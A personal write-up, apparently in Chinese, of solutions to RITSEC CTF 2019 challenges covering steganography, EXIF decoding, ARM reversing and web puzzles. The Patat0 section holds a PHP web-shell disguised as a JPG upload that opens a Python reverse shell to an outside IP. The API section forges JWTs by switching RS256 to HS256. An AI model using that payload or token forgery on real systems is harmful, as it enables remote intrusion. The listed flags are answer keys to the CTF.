---
tags: CTF
---

# RITSEC CTF(11/15 ~ 11/17)

### Result
子筠好電
![](https://i.imgur.com/gcyh2o4.png)
----
## 999bottles

不知道可以幹麻
```F")|/f,:PsUUmKL*z(;N`QPtDZvX@j~=]q)AJ$w#g|Kehk)_$D_k;ESDz@ZK#=ZWfCo[GYG;FQ`W"mhoPlhr#W"N=RUxzjh"}&PJWWE@Jh%vKEIey`h,Xvxnsce/oqb,&*{#o&gMe-:RbSJO*>QIicbo<[sm>rmT@$@MgEwi:t{;U$WU[wRI!]+l[ngTqU>W:W*)$Sb},PmyEdJ~puK^zk!y.]M].vnBl!.OECe=JDiM|n+RihaL"x_p@M^P!f<Pa*j,A#"-,_n+z[?-bsQ.LBc{r<xR$[vuA/vMq%/_f-Yqg#$V}y&}[ReHU,`{^L/?rQlEW:Tv&l|&Ac#=FgrQR@a[Awwh-EEK@L:xf`M@E&}VFOZo:]ObRyiAomKD|,=pErk)wr%ir!J+`.DkN_`k>D}yrZ^@J&,qIRo|dvY+m@o:{cBvSE:G<;lGzV?NwpG*`VMnqSdXjN:r#=`=qq[qsn_kih>|M|WzEfz^|J>GTEc~k=KEbr@xOrP}iQnw#-uO-/]iCmbtBV+N*CmUiWl;STEf@}oB!e*!K#wmg](w.P]jm_o;Qec"AVm}JA#ua=hptzPVH?MSbopjRYUzDL_[[pA[)huW;=mhbIPAibwC[?o!"t.uKy[o~NiG;B=T.Rrn&OrF:&J&Xf`lr^wN${HnW<DtVjk.RITSEC{AuT057v}^W!xT;ImOU;ruPEQJKtRPlL#aGA.[PX,;,e~$t:*^dR?P_daEe,_{#r+iNrE-UVdeQh]GiIO+G;*.m=&+g#x|P!oXA(iFm({ZgTIohA<,.e(&KWw|>~,Wl<XH]<zT|H;gl.I_n"JAJ=n&}KJV{wsIFgsGHv@)+kj&>AQ~%xxK}<D?V+~oD?p=IZ$,Uy:L}$d[*VboIFrUuxp{{U!&e}-MSFDal(dIp^dN]D_`DYi!$VpNB-ZCUYKVxXta$Ur*!kSN`k>#fOzg]"ERlSIE~g)YlRi^oZg*Y,|ODGgbrXoqljJzChJ"c+ZRjy]}f{e```

..... RITSEC{AuT057v}
好廢


##  Knock Knock

listener@129.21.228.115
password

119.77.147.241.54626 > 192.168.0.33.22

192.168.0.33.22 傳出去的有 incorrect checksum
192.168.0.33.22 上應該是ssh server


## Our First API

http://ctfchallenges.ritsec.club:3000/AUTH?name=123

{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiMTIzIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1NzM4OTgyMjh9.DWnZZVfY9hl1NT4gz-uKq67L0gOIOBadQ6agGFtpWkDhzBShGp_qoYSK4knC2x77uoSlNVr14xIiY_hpJFKzFezeXY92jjq-red9bGn5IKDsr5jXwnCtUOBvmfYUg5tYeCLezib_r9KTYnAqne2QM_EctztiFy_76BI_5-wVMzc"}

重新整理很多次 發現以下部份不變
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiMTIzIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1NzM4OTgzMjB9

atob("eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9")
"{"typ":"JWT","alg":"RS256"}"

atob("eyJuYW1lIjoiMTIzIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1NzM4OTgzMjB9")
"{"name":"123","type":"user","iat":1573898320}"

用 "Authorization": "token" 送過去可以驗證

html comment -> robots can help you

http://ctfchallenges.ritsec.club:3000/robots.txt
```
User-agent: * Disallow: /signing.pem Disallow: /auth
```
得到signing.pem
把alg改成HS256
RITSEC{JWT_th1s_0ne_d0wn}

## Patch Tuesday

strings
RITSEC{PATCHM3IFYOUCAN}
...wtf

## findme.pcap

http://phrack.org/issues/7/3.html

## The doges
- Strings
沒看到什麼線索
- binwalk
只有一個JPG檔
- online tools(https://georgeom.net/StegOnline/upload)
直接調圖的顏色
看不出東西

根據題目所說"The doge holds the information you want, feed the doge a treat to get the hidden message."，應該是要餵一個東西進去圖片

我好爛
找不到線索TAT
https://null-byte.wonderhowto.com/how-to/steganography-hide-secret-data-inside-image-audio-file-seconds-0180936/
用 steghide 輸密碼 treat


## Patat0

1. upload.php
2. uploads/
3. photos.php

cat a.jpg a.php > a.php.jpg
不知道為什麼用sh/nc/bash reverse shell沒成功

```php
<?php echo exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"140.112.150.96\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"); echo "<h1>Hi Py</h1>";?>
```


cat /home/flag.txt

我好爛
RS_CTF{FILE_UPLOAD_ISN'T_SECURE}
## Resume Bank!

丟pdf上去就過了?? 我爛

RITSEC{g3t_th3_r3sum3s}


## Take to the cleaner

跟原圖 diff 之後解zlib出現這個
不知道可以幹麻

```
generic profile
     358
4578696600004d4d002a000000080007010e000200000054000000620128000300000001
00020000013b000200000009000000b6021300030000000100010000829800020000000c
000000c08769000400000001000000cc8825000400000001000001420000000048692074
6865726521204c6f6f6b73206c696b6520796f75726520747279696e6720746f20736f6c
76652074686520666f72656e7369635f6661696c73206368616c6c656e67652120476f6f
64206c75636b2100496d706f733733720000524954534543203230313800000490000007
0000000430323331910100070000000401020300928600070000004000000102a0000007
000000043031303000000000415343494900000052565a48526c4a5165314e4352564a42
526c5a51526c3954546c5a5a526c394b516b46485831565357554e6654454a4958315653
52564a39000200010002000000024e00000000030002000000025700000000000000
```

```
ExifMMTb(;  ¶iÌ%BHi there! Looks like youre trying to solve the forensic_fails challenge! Good luck!Impos73rRITSEC 2018@ 0100ASCIIRVZHRlJQe1NCRVJBRlZQRl9TTlZZRl9KQkFHX1VSWUNfTEJIX1VSRVJ9NW
```

base64decode + Caesar cipher
## HD PEPE
binwalk 後 A0A4D8
```
generic profile
     312
4578696600004d4d002a000000080006010e000200000017000000560128000300000001
00020000013b00020000000b0000006e0213000300000001000100008769000400000001
0000007a8825000400000001000000cc0000000067683a63796265726d6536393432302f
6864706570650000646567656e6572617433000000049000000700000004303233319101
00070000000401020300928600070000001c000000b0a000000700000004303130300000
0000415343494900000076657273696f6e20636f6e74726f6c2068656865000400010002
000000024e00000000020005000000030000010200030002000000024500000000040005
000000030000011a0000000000000027000000010000000100000001000054af00000861
0000007d000000010000002d0000000100001dc700000271
```
-> 轉成ascii
```
ExifMMV(;
         niz%Ìgh:cyberme69420/hdpepedegenerat3° 0100ASCIIversion control heheNE'Ta}-Çq
```

因為題目敘述有提到alpha，因此推測和alpha channel有關。
把圖片load進來後會發現，alpha channel只有40個不為255。
分別是
```
[170 148 147 170 170 207 169 187 154 207 207 133 171 171 177 171 167 207
 177 189 171 147 198 188 178 206 198 177 177 186 135 181 174 207 147 175
 169 169 177 198]
```
將其用255扣掉後變成
```
[ 85 107 108  85  85  48  86  68 101  48  48 122  84  84  78  84  88  48
  78  66  84 108  57  67  77  49  57  78  78  69 120  74  81  48 108  80
  86  86  78  57]
```
再轉成ascii
```
UklUU0VDe00zTTNTX0NBTl9CM19NNExJQ0lPVVN9
```
再經過base64
```
RITSEC{M3M3S_CAN_B3_M4LICIOUS}
```

## onion layer
硬解，一直試能不能做b64/32/16decode，能做就繼續試
`RITSEC{0n1On_L4y3R}`

## hop by hop

Apache2.4.29
> .htaccess
You have been stopped by The Good Good Proxy WAF

https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers
Connection: Close, X-Forwarded-For
## Pre-legend

![](https://i.imgur.com/bxexHFs.png)

rot47 得到
https://github.com/clayball/something-useful-ritsec
    
https://github.com/clayball/something-useful-ritsec/blob/master/transpositionDecrypt.py

## Chrome

00107a00

## lunar lander
不知道有啥用
star a|star b |distance
-|-|-
18	| 11 |     36
5 	|26  |     80
25	| 5  |     213.8
1 	|33  |     25.61
34	| 2  |     107.7
18	| 25 |     212.4
17	| 9  |     188.3
28	| 20 |     58.5
34	| 6  |     56.9
20	| 15 |     69.16
36	| 34 |     74.31
17	| 16 |     194.6
9 	|11  |     267.5
28	| 12 |     36.74
13	| 16 |     150.6
32	| 26 |     324.2
29	| 30 |     419.9
17	| 16 |     194.6
7 	|12  |     270.9
16	| 13 |     150.6
22	| 17 |     118.8
11	| 18 |     121.2
1 	|33  |     25.61
5 	|29  |     417.3

## Yeet

看不懂applescript
![](https://i.imgur.com/8XhYVfE.png)

main.scpt發現這段
用base64解
```javascript
atob("UklUU0VDe3Byb3BpZXRhcnlfYnl0ZWNvZGVfZnR3X3BoYW50MG19")
"RITSEC{propietary_bytecode_ftw_phant0m}"
```

## Acorn
```
decode():
        sub     sp, sp, #48                          ; sp -= 48
        adrp    x8, .L_ZZ6decodevE8password
        add     x8, x8, :lo12:.L_ZZ6decodevE8password ; 簡單來說 x8 會是 .L_ZZ6decodevE8password 的 address
        ldur    q0, [x8, #30]      ; q0 = *(x8+30)
        ldp     q2, q1, [x8]       ; load pair: [x8] 存到 q2, [x8 + 16] 存到 q1
        mov     x8, sp             ; x8 = sp
        mov     w9, #33            ; x9 = 33
        stur    q0, [sp, #30]      ; *(sp + 30) = q0
        stp     q2, q1, [sp]       ; q2 存到 [sp], q1 存到 [sp + 16]
.LBB0_1:   ; =>This Inner Loop Header: Depth=1
        ldrb    w10, [x8]          ; 把 x8 address 上的最右 byte 存到 w10
        eor     w10, w10, w9       ; xor: w10 = w10 ^ w9
        sub     w10, w10, #21      ; w10 -= 21
        strb    w10, [x8], #1      ; 把 w10 的最右 byte 存到 x8 的 address 上, x8 + 1
        b       .LBB0_1            ; 跳回 LBB0_1
.L_ZZ6decodevE8password:
        .asciz  "leno{yZB[U~HEY[~UKQ~YWH~L[P[LO[~wli~WOO[IVFU\\"
```
- Arm assembly doc: https://static.docs.arm.com/100076/0100/arm_instruction_set_reference_guide_100076_0100_00_en.pdf
- 所有 instruction 都是 4 bytes
- Registers
    - 31 個 general purpose register
        - w: 32-bit (w 是 x 的後 32 個 bit)
        - x: 64-bit
    - 另外 32 個 floating point/vector operation registers
        - b: 8
        - h: 16
        - s: 32
        - d: 64
        - q: 128 (16 byte)

```
q0 = "[~wli~WOO[IVFU\\"
q2 = "leno{yZB[U~HEY[~"
q1 = "UKQ~YWH~L[P[LO[~"
sp -> "012345678901234567890123456789[~wli~WOO[IVFU\\"
sp -> "leno{yZB[U~HEY[~UKQ~YWH~L[P[LO[~wli~WOO[IVFU\\"
x8 -> "leno"



sp -> "leno{yZB[U~HEY[~UKQ~YWH~L[P[LO[~[~wli~WOO[IVFU\\"
NWYr
```
## 備忘錄
zsteg
steghide